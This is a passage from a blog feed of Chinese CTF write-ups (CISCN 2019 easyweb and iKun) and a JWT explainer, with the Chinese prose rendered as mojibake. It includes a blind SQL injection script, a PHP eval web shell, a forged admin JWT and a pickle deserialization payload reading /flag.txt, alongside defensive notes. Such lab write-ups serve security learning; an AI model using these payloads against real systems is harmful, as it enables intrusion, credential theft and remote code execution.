operator">=</span> <span class="token string">" or id=if(ascii(substr((select password from users limit 1 offset 0),%d,1))>%d,1,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string">'\\\\0'</span><span class="token punctuation">,</span>            <span class="token string">'path'</span><span class="token punctuation">:</span>payload        <span class="token punctuation">}</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token keyword">if</span> b<span class="token string">'JFIF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><pre><code>admin952e152f6e0fcacecee4</code></pre><p>ç™»å½•</p><p><img src="/2021/07/26/ciscn-2019-easyweb/2.png" alt="2"></p><p>å› ä¸ºä¸å…è®¸ä¸Šä¼ å¸¦phpçš„æ–‡ä»¶åï¼Œæˆ‘ä»¬ç”¨phpçŸ­æ ‡ç­¾æ¥ç»•è¿‡<br> <code>&lt;?php @eval($_POST['a']);?&gt;</code>å¯ä»¥ç”¨<code>&lt;?=@eval($_POST['a']);?&gt;</code>æ¥ä»£æ›¿</p><p>æ–‡ä»¶åŽç¼€è¯¥ä¸ºlogä¼šå˜ä¸ºphp</p><p><img src="/2021/07/26/ciscn-2019-easyweb/3.png" alt="3"></p><p><a href="http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/logs/upload.c415dd0f21035fea682165a2b0be676e.log.php">http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/logs/upload.c415dd0f21035fea682165a2b0be676e.log.php</a></p><p>èšå‰‘è¿žæŽ¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN:2019-iKun</title>
      <link href="2021/07/25/ciscn-2019-ikun/"/>
      <url>2021/07/25/ciscn-2019-ikun/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON-Web-Token"><a href="#JSON-Web-Token" class="headerlink" title="JSON Web Token"></a>JSON Web Token</h2><p><a href="http://lxh3ng.github.io/2021/07/24/json-web-token/">http://LXH3ng.github.io/2021/07/24/json-web-token/</a></p><h2 id="Pythoné­”æ³•æ–¹æ³•æŒ‡å—"><a href="#Pythoné­”æ³•æ–¹æ³•æŒ‡å—" class="headerlink" title="Pythoné­”æ³•æ–¹æ³•æŒ‡å—"></a>Pythoné­”æ³•æ–¹æ³•æŒ‡å—</h2><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055">https://blog.csdn.net/bluehawksky/article/details/79027055</a></p><h2 id="pickleååºåˆ—åŒ–"><a href="#pickleååºåˆ—åŒ–" class="headerlink" title="pickleååºåˆ—åŒ–"></a>pickleååºåˆ—åŒ–</h2><p>å‚è€ƒ<a href="https://www.cnblogs.com/wangtanzhi/p/12178311.html">https://www.cnblogs.com/wangtanzhi/p/12178311.html</a></p><p>pickleæä¾›äº†ä¸€ä¸ªç®€å•çš„æŒä¹…åŒ–åŠŸèƒ½ã€‚å¯ä»¥å°†å¯¹è±¡ä»¥æ–‡ä»¶çš„å½¢å¼å­˜æ”¾åœ¨ç£ç›˜ä¸Šã€‚</p><p>pickleæ¨¡å—åªèƒ½åœ¨pythonä¸­ä½¿ç”¨ï¼Œpythonä¸­å‡ ä¹Žæ‰€æœ‰çš„æ•°æ®ç±»åž‹ï¼ˆåˆ—è¡¨ï¼Œå­—å…¸ï¼Œé›†åˆï¼Œç±»ç­‰ï¼‰éƒ½å¯ä»¥ç”¨pickleæ¥åºåˆ—åŒ–ï¼Œ<br> pickleåºåˆ—åŒ–åŽçš„æ•°æ®ï¼Œå¯è¯»æ€§å·®ï¼Œäººä¸€èˆ¬æ— æ³•è¯†åˆ«ã€‚</p><p>p = pickle.loads(urllib.unquote(become))</p><p>urllib.unquote:å°†å­˜å…¥çš„å­—å…¸å‚æ•°ç¼–ç ä¸ºURLæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå³è½¬æ¢æˆä»¥key1 = value1 &amp; key2 =  value2çš„å½¢å¼pickle.loads(bytes_object):  ä»Žå­—èŠ‚å¯¹è±¡ä¸­è¯»å–è¢«å°è£…çš„å¯¹è±¡ï¼Œå¹¶è¿”å›žæˆ‘çœ‹äº†å¸ˆå‚…ä»¬çš„åšå®¢ä¹‹åŽçš„ç†è§£å°±æ˜¯ï¼Œæˆ‘ä»¬æž„å»ºä¸€ä¸ªç±»ï¼Œç±»é‡Œé¢çš„__reduce__pythoné­”æœ¯æ–¹æ³•ä¼šåœ¨è¯¥ç±»è¢«ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè¢«è°ƒç”¨Pickleæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡½æ•°ä¸ºï¼š</p><p>ï¼ˆ1ï¼‰pickle.dump(obj, file, [,protocol])</p><pre><code>    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–å­˜å…¥å·²ç»æ‰“å¼€çš„fileä¸­ã€‚   å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚file:æ–‡ä»¶åç§°ã€‚protocolï¼šåºåˆ—åŒ–ä½¿ç”¨çš„åè®®ã€‚å¦‚æžœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æžœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p>ï¼ˆ2ï¼‰pickle.load(file)</p><pre><code>    å‡½æ•°çš„åŠŸèƒ½ï¼šå°†fileä¸­çš„å¯¹è±¡åºåˆ—åŒ–è¯»å‡ºã€‚    å‚æ•°è®²è§£ï¼šfileï¼šæ–‡ä»¶åç§°ã€‚</code></pre><p>ï¼ˆ3ï¼‰pickle.dumps(obj[, protocol])</p><pre><code>   å‡½æ•°çš„åŠŸèƒ½ï¼šå°†objå¯¹è±¡åºåˆ—åŒ–ä¸ºstringå½¢å¼ï¼Œè€Œä¸æ˜¯å­˜å…¥æ–‡ä»¶ä¸­ã€‚   å‚æ•°è®²è§£ï¼šobjï¼šæƒ³è¦åºåˆ—åŒ–çš„objå¯¹è±¡ã€‚protocalï¼šå¦‚æžœè¯¥é¡¹çœç•¥ï¼Œåˆ™é»˜è®¤ä¸º0ã€‚å¦‚æžœä¸ºè´Ÿå€¼æˆ–HIGHEST_PROTOCOLï¼Œåˆ™ä½¿ç”¨æœ€é«˜çš„åè®®ç‰ˆæœ¬ã€‚</code></pre><p>ï¼ˆ4ï¼‰pickle.loads(string)</p><pre><code>   å‡½æ•°çš„åŠŸèƒ½ï¼šä»Žstringä¸­è¯»å‡ºåºåˆ—åŒ–å‰çš„objå¯¹è±¡ã€‚   å‚æ•°è®²è§£ï¼šstringï¼šæ–‡ä»¶åç§°ã€‚ ã€æ³¨ã€‘ dump() ä¸Ž load() ç›¸æ¯” dumps() å’Œ loads() è¿˜æœ‰å¦ä¸€ç§èƒ½åŠ›ï¼šdump()å‡½æ•°èƒ½ä¸€ä¸ªæŽ¥ç€ä¸€ä¸ªåœ°å°†å‡ ä¸ªå¯¹è±¡åºåˆ—åŒ–å­˜å‚¨åˆ°åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ŒéšåŽè°ƒç”¨load()æ¥ä»¥åŒæ ·çš„é¡ºåºååºåˆ—åŒ–è¯»å‡ºè¿™äº›å¯¹è±¡ã€‚è€Œåœ¨__reduce__æ–¹æ³•é‡Œé¢æˆ‘ä»¬å°±è¿›è¡Œè¯»å–flag.txtæ–‡ä»¶ï¼Œå¹¶å°†è¯¥ç±»åºåˆ—åŒ–ä¹‹åŽè¿›è¡ŒURLç¼–ç </code></pre><p>æ£€æµ‹ååºåˆ—åŒ–æ–¹æ³•ï¼š</p><pre><code>å…¨å±€æœç´¢Pythonä»£ç ä¸­æ˜¯å¦å«æœ‰å…³é”®å­—ç±»ä¼¼â€œimport cPickleâ€æˆ–â€œimport pickleâ€ç­‰ï¼Œè‹¥å­˜åœ¨åˆ™è¿›ä¸€æ­¥ç¡®è®¤æ˜¯å¦è°ƒç”¨cPickle.loads()æˆ–pickle.loads()ä¸”ååºåˆ—åŒ–çš„å‚æ•°å¯æŽ§ã€‚</code></pre><p>é˜²å¾¡æ–¹æ³•</p><pre><code>1ã€ç”¨æ›´é«˜çº§çš„æŽ¥å£__getnewargs()ã€__getstate__()ã€__setstate__()ç­‰ä»£æ›¿__reduce__()é­”æœ¯æ–¹æ³•ï¼›2ã€è¿›è¡Œååºåˆ—åŒ–æ“ä½œä¹‹å‰ï¼Œè¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ï¼Œè‹¥é‡‡ç”¨çš„æ˜¯pickleåº“å¯é‡‡ç”¨è£…é¥°å™¨å®žçŽ°ã€‚</code></pre><h2 id="CISCN-2019-iKun"><a href="#CISCN-2019-iKun" class="headerlink" title="CISCN:2019-iKun"></a>CISCN:2019-iKun</h2><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195120596.png" alt="image-20210726195120596"></p><p>ikunä»¬å†²é¸­,ä¸€å®šè¦ä¹°åˆ°lv6!!!</p><p>ç”¨pythonè„šæœ¬çˆ†ç ´å‡ºlv6</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://http://2018cc7d-054e-441d-a785-5701d87e6da9.node4.buuoj.cn/shop?page="</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">break</span></code></pre><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195347258.png" alt="image-20210726195347258"></p><p>å¥½åƒæœ‰ç‚¹è´µ</p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195509076.png" alt="image-20210726195509076"></p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195548608.png" alt="image-20210726195548608"></p><p>æŠ“åŒ…çœ‹åˆ°è¿™é‡Œæœ‰JWTå’Œdiscount</p><p>ç ´è§£<a href="https://codechina.csdn.net/mirrors/brendan-rius/c-jwt-cracker?utm_source=csdn_github_accelerator">sha256çš„key</a></p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726195912776.png" alt="image-20210726195912776"></p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></pre><p>å¹¶ä¿®æ”¹discount=0.00000001</p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726200858551.png" alt="image-20210726200858551"></p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726200915609.png" alt="image-20210726200915609"></p><p>ä¸‹è½½åŽåœ¨admin.pyä¸­çœ‹åˆ°pythonååºåˆ—åŒ–çš„ä»£ç </p><pre class=" language-python"><code class="language-python">  <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><strong>æ¼æ´žäº§ç”Ÿçš„åŽŸå› åœ¨äºŽå…¶å¯ä»¥å°†è‡ªå®šä¹‰çš„ç±»è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚ååºåˆ—åŒ–åŽäº§ç”Ÿçš„å¯¹è±¡ä¼šåœ¨ç»“æŸæ—¶è§¦å‘<strong>reduce</strong>()å‡½æ•°ä»Žè€Œè§¦å‘æ¶æ„ä»£ç ã€‚</strong></p><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726204028813.png" alt="image-20210726204028813"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span> a</code></pre><pre><code>become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.=</code></pre><p><img src="/2021/07/25/ciscn-2019-ikun/image-20210726205302570.png" alt="image-20210726205302570"></p>]]></content>
      
      
      
        <tags>
            
            <tag> JWT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSON Web Token</title>
      <link href="2021/07/24/json-web-token/"/>
      <url>2021/07/24/json-web-token/</url>
      
        <content type="html"><![CDATA[<h2 id="JSON-Web-Tokençš„å®šä¹‰"><a href="#JSON-Web-Tokençš„å®šä¹‰" class="headerlink" title="JSON Web Tokençš„å®šä¹‰"></a>JSON Web Tokençš„å®šä¹‰</h2><ul><li>JSON Web Token (JWT)æ˜¯ä¸€ä¸ªå¼€æ”¾æ ‡å‡†(RFC 7519)</li><li>å®šä¹‰äº†ä¸€ç§ç´§å‡‘çš„ã€è‡ªåŒ…å«çš„æ–¹å¼</li><li>ä½œä¸ºJSONå¯¹è±¡åœ¨å„æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“ä¿¡æ¯</li><li>æ˜¯æ•°å­—ç­¾å -&gt; å¯ä»¥è¢«éªŒè¯å’Œä¿¡ä»»</li></ul><h2 id="JSON-Web-Tokençš„ä½¿ç”¨åœºæ™¯"><a href="#JSON-Web-Tokençš„ä½¿ç”¨åœºæ™¯" class="headerlink" title="JSON Web Tokençš„ä½¿ç”¨åœºæ™¯"></a>JSON Web Tokençš„ä½¿ç”¨åœºæ™¯</h2><ul><li><strong>Authorization</strong> (æŽˆæƒ) : è¿™æ˜¯ä½¿ç”¨JWTçš„æœ€å¸¸è§åœºæ™¯ã€‚ä¸€æ—¦ç”¨æˆ·ç™»å½•ï¼ŒåŽç»­æ¯ä¸ªè¯·æ±‚éƒ½å°†åŒ…å«JWTï¼Œå…è®¸ç”¨æˆ·è®¿é—®è¯¥ä»¤ç‰Œå…è®¸çš„è·¯ç”±ã€æœåŠ¡å’Œèµ„æºã€‚å•ç‚¹ç™»å½•æ˜¯çŽ°åœ¨å¹¿æ³›ä½¿ç”¨çš„JWTçš„ä¸€ä¸ªç‰¹æ€§ï¼Œå› ä¸ºå®ƒçš„å¼€é”€å¾ˆå°ï¼Œå¹¶ä¸”å¯ä»¥è½»æ¾åœ°è·¨åŸŸä½¿ç”¨ã€‚</li><li><strong>Information Exchange</strong> (ä¿¡æ¯äº¤æ¢) :JWTså¯ä»¥è¢«ç­¾åï¼Œä¾‹å¦‚ï¼Œç”¨å…¬é’¥/ç§é’¥å¯¹ï¼Œå¯ä»¥ç¡®å®šå‘é€äººå°±æ˜¯å®ƒä»¬æ‰€è¯´çš„é‚£ä¸ªäººã€‚å¦å¤–ï¼Œç”±äºŽç­¾åæ˜¯ä½¿ç”¨å¤´å’Œæœ‰æ•ˆè´Ÿè½½è®¡ç®—çš„ï¼Œæ‚¨è¿˜å¯ä»¥éªŒè¯å†…å®¹æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</li></ul><h2 id="JSON-Web-Tokençš„ç»“æž„"><a href="#JSON-Web-Tokençš„ç»“æž„" class="headerlink" title="JSON Web Tokençš„ç»“æž„"></a>JSON Web Tokençš„ç»“æž„</h2><p><img src="/2021/07/24/json-web-token/image-20210726041459952.png" alt="image-20210726041459952"></p><p>ä¸‰éƒ¨åˆ† åœ†ç‚¹è¿žæŽ¥</p><ol><li><strong>Header</strong></li><li><strong>Payload</strong></li><li><strong>Signature</strong></li></ol><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>headerå…¸åž‹çš„ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼štokençš„ç±»åž‹ï¼ˆâ€œJWTâ€ï¼‰å’Œç®—æ³•åç§°ï¼ˆæ¯”å¦‚ï¼šHMAC SHA256æˆ–è€…RSAç­‰ç­‰ï¼‰ã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre><code>{    "alg":"HS256",    "typ":"JWT"}</code></pre><p>å¯¹å…¶è¿›è¡Œbase64ç¼–ç åŽå¾—åˆ°JWTç¬¬ä¸€éƒ¨åˆ†</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>JWTçš„ç¬¬äºŒéƒ¨åˆ†æ˜¯payloadï¼Œå®ƒåŒ…å«å£°æ˜Žï¼ˆè¦æ±‚ï¼‰ã€‚å£°æ˜Žæ˜¯å…³äºŽå®žä½“(é€šå¸¸æ˜¯ç”¨æˆ·)å’Œå…¶ä»–æ•°æ®çš„å£°æ˜Žã€‚å£°æ˜Žæœ‰ä¸‰ç§ç±»åž‹: registered, public å’Œ privateã€‚</p><ul><li>Registered claims : è¿™é‡Œæœ‰ä¸€ç»„é¢„å®šä¹‰çš„å£°æ˜Žï¼Œå®ƒä»¬ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œä½†æ˜¯æŽ¨èã€‚æ¯”å¦‚ï¼šiss (issuer), exp (expiration time), sub (subject), aud (audience)ç­‰ã€‚</li><li>Public claims : å¯ä»¥éšæ„å®šä¹‰ã€‚</li><li>Private claims : ç”¨äºŽåœ¨åŒæ„ä½¿ç”¨å®ƒä»¬çš„å„æ–¹ä¹‹é—´å…±äº«ä¿¡æ¯ï¼Œå¹¶ä¸”ä¸æ˜¯æ³¨å†Œçš„æˆ–å…¬å¼€çš„å£°æ˜Žã€‚</li></ul><p>ä¾‹å¦‚ï¼š</p><pre><code>{    "sub":"123456",    "name":"CTF",    "admin":ture}</code></pre><p>å¯¹å…¶è¿›è¡Œbase64å¾—åˆ°JWTç¬¬äºŒéƒ¨åˆ†</p><p>æ³¨æ„ï¼šJWTçš„headeræˆ–payloadå‹¿æ”¾ç½®æœªåŠ å¯†çš„æ•æ„Ÿä¿¡æ¯ã€‚</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>signatureç”±base64(header)ï¼Œbase64(payload)å’Œç§˜é’¥ç»„æˆï¼Œç­¾åç®—æ³•æ˜¯headerä¸­æŒ‡å®šçš„é‚£ä¸ªï¼Œç„¶å¯¹å®ƒä»¬ç­¾åå³å¯ã€‚</p><p>ä¾‹å¦‚ï¼š</p><pre><code>HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)</code></pre><p><img src="/2021/07/24/json-web-token/image-20210726042519069.png" alt="image-20210726042519069"></p><p><img src="/2021/07/24/json-web-token/image-20210726043023893.png" alt="image-20210726043023893"></p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiemhhbmdzYW4iLCJjb2RlIjoiMjEyMzQxMCJ9.aaa</code></pre><h2 id="JSON-Web-Tokençš„å·¥ä½œ"><a href="#JSON-Web-Tokençš„å·¥ä½œ" class="headerlink" title="JSON Web Tokençš„å·¥ä½œ"></a>JSON Web Tokençš„å·¥ä½œ</h2><ol><li><p>ç”¨æˆ·ç™»å½•</p></li><li><p>è¿”å›žJWT</p></li><li><p>tokenæˆä¸ºç”¨æˆ·å‡­è¯ï¼ˆä¿å­˜ä»¤ç‰Œä¸åº”è¶…è¿‡éœ€è¦æ—¶é—´ï¼‰</p></li><li><p>è®¿é—®å—ä¿æŠ¤çš„è·¯ç”±æˆ–è€…èµ„æºï¼ŒJWTæ”¾åœ¨Authorization headerä¸­ï¼Œç”¨Bearer schemaã€‚</p><img src="/2021/07/24/json-web-token/image-20210726043710776.png" alt="image-20210726043710776" style="zoom: 67%;"></li><li><p>æœåŠ¡å™¨æ£€æŸ¥JWTæ˜¯å¦æœ‰æ•ˆ</p><p>å¦‚æžœtokenæ˜¯åœ¨æŽˆæƒå¤´ï¼ˆAuthorization headerï¼‰ä¸­å‘é€çš„ï¼Œé‚£ä¹ˆè·¨æºèµ„æºå…±äº«(CORS)å°†ä¸ä¼šæˆä¸ºé—®é¢˜ï¼Œå› ä¸ºå®ƒä¸ä½¿ç”¨cookie</p><img src="/2021/07/24/json-web-token/image-20210726043830317.png" alt="image-20210726043830317" style="zoom:67%;"><ul><li>åº”ç”¨ï¼ˆæˆ–è€…å®¢æˆ·ç«¯ï¼‰æƒ³æŽˆæƒæœåŠ¡å™¨è¯·æ±‚æŽˆæƒã€‚ä¾‹å¦‚ï¼Œå¦‚æžœç”¨æŽˆæƒç æµç¨‹çš„è¯ï¼Œå°±æ˜¯/oauth/authorize</li><li>å½“æŽˆæƒè¢«è®¸å¯ä»¥åŽï¼ŒæŽˆæƒæœåŠ¡å™¨è¿”å›žä¸€ä¸ªaccess tokenç»™åº”ç”¨</li><li>åº”ç”¨ä½¿ç”¨access tokenè®¿é—®å—ä¿æŠ¤çš„èµ„æºï¼ˆæ¯”å¦‚ï¼šAPIï¼‰</li></ul></li></ol><h2 id="åŸºäºŽTokençš„èº«ä»½è®¤è¯-ä¸Ž-åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯"><a href="#åŸºäºŽTokençš„èº«ä»½è®¤è¯-ä¸Ž-åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯" class="headerlink" title="åŸºäºŽTokençš„èº«ä»½è®¤è¯ ä¸Ž åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯"></a>åŸºäºŽTokençš„èº«ä»½è®¤è¯ ä¸Ž åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯</h2><h3 id="åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯"><a href="#åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯" class="headerlink" title="åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯"></a>åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯</h3><p>ä¼ ç»Ÿçš„åšæ³•æ˜¯å°†å·²ç»è®¤è¯è¿‡çš„ç”¨æˆ·ä¿¡æ¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ¯”å¦‚Sessionã€‚ç”¨æˆ·ä¸‹æ¬¡è¯·æ±‚çš„æ—¶å€™å¸¦ç€Session IDï¼Œç„¶åŽæœåŠ¡å™¨ä»¥æ­¤æ£€æŸ¥ç”¨æˆ·æ˜¯å¦è®¤è¯è¿‡ã€‚</p><p>è¿™ç§åŸºäºŽæœåŠ¡å™¨çš„èº«ä»½è®¤è¯æ–¹å¼å­˜åœ¨ä¸€äº›é—®é¢˜ï¼š</p><ul><li>Sessions : æ¯æ¬¡ç”¨æˆ·è®¤è¯é€šè¿‡ä»¥åŽï¼ŒæœåŠ¡å™¨éœ€è¦åˆ›å»ºä¸€æ¡è®°å½•ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œé€šå¸¸æ˜¯åœ¨å†…å­˜ä¸­ï¼Œéšç€è®¤è¯é€šè¿‡çš„ç”¨æˆ·è¶Šæ¥è¶Šå¤šï¼ŒæœåŠ¡å™¨çš„åœ¨è¿™é‡Œçš„å¼€é”€å°±ä¼šè¶Šæ¥è¶Šå¤§ã€‚</li><li>Scalability : ç”±äºŽSessionæ˜¯åœ¨å†…å­˜ä¸­çš„ï¼Œè¿™å°±å¸¦æ¥ä¸€äº›æ‰©å±•æ€§çš„é—®é¢˜ã€‚</li><li>CORS : å½“æˆ‘ä»¬æƒ³è¦æ‰©å±•æˆ‘ä»¬çš„åº”ç”¨ï¼Œè®©æˆ‘ä»¬çš„æ•°æ®è¢«å¤šä¸ªç§»åŠ¨è®¾å¤‡ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬å¿…é¡»è€ƒè™‘è·¨èµ„æºå…±äº«é—®é¢˜ã€‚å½“ä½¿ç”¨AJAXè°ƒç”¨ä»Žå¦ä¸€ä¸ªåŸŸåä¸‹èŽ·å–èµ„æºæ—¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šé‡åˆ°ç¦æ­¢è¯·æ±‚çš„é—®é¢˜ã€‚</li><li>CSRF : ç”¨æˆ·å¾ˆå®¹æ˜“å—åˆ°CSRFæ”»å‡»ã€‚</li></ul><h3 id="JWTä¸ŽSessionçš„å·®å¼‚"><a href="#JWTä¸ŽSessionçš„å·®å¼‚" class="headerlink" title="JWTä¸ŽSessionçš„å·®å¼‚"></a>JWTä¸ŽSessionçš„å·®å¼‚</h3><p>ç›¸åŒç‚¹æ˜¯ï¼Œå®ƒä»¬éƒ½æ˜¯å­˜å‚¨ç”¨æˆ·ä¿¡æ¯ï¼›ç„¶è€Œï¼ŒSessionæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œè€ŒJWTæ˜¯åœ¨å®¢æˆ·ç«¯çš„ã€‚</p><p>Sessionæ–¹å¼å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æœ€å¤§é—®é¢˜åœ¨äºŽè¦å ç”¨å¤§é‡æœåŠ¡å™¨å†…å­˜ï¼Œå¢žåŠ æœåŠ¡å™¨çš„å¼€é”€ã€‚</p><p>è€ŒJWTæ–¹å¼å°†ç”¨æˆ·çŠ¶æ€åˆ†æ•£åˆ°äº†å®¢æˆ·ç«¯ä¸­ï¼Œå¯ä»¥æ˜Žæ˜¾å‡è½»æœåŠ¡ç«¯çš„å†…å­˜åŽ‹åŠ›ã€‚</p><p>Sessionçš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œå®¢æˆ·ç«¯åªæœ‰session idï¼›è€ŒTokençš„çŠ¶æ€æ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ã€‚</p><p><img src="/2021/07/24/json-web-token/image-20210726044027547.png" alt="image-20210726044027547"></p><h3 id="åŸºäºŽTokençš„èº«ä»½è®¤è¯æ˜¯å¦‚ä½•å·¥ä½œçš„"><a href="#åŸºäºŽTokençš„èº«ä»½è®¤è¯æ˜¯å¦‚ä½•å·¥ä½œçš„" class="headerlink" title="åŸºäºŽTokençš„èº«ä»½è®¤è¯æ˜¯å¦‚ä½•å·¥ä½œçš„"></a>åŸºäºŽTokençš„èº«ä»½è®¤è¯æ˜¯å¦‚ä½•å·¥ä½œçš„</h3><p>åŸºäºŽTokençš„èº«ä»½è®¤è¯æ˜¯æ— çŠ¶æ€çš„ï¼ŒæœåŠ¡å™¨æˆ–è€…Sessionä¸­ä¸ä¼šå­˜å‚¨ä»»ä½•ç”¨æˆ·ä¿¡æ¯ã€‚</p><blockquote><p>æ²¡æœ‰ä¼šè¯ä¿¡æ¯æ„å‘³ç€åº”ç”¨ç¨‹åºå¯ä»¥æ 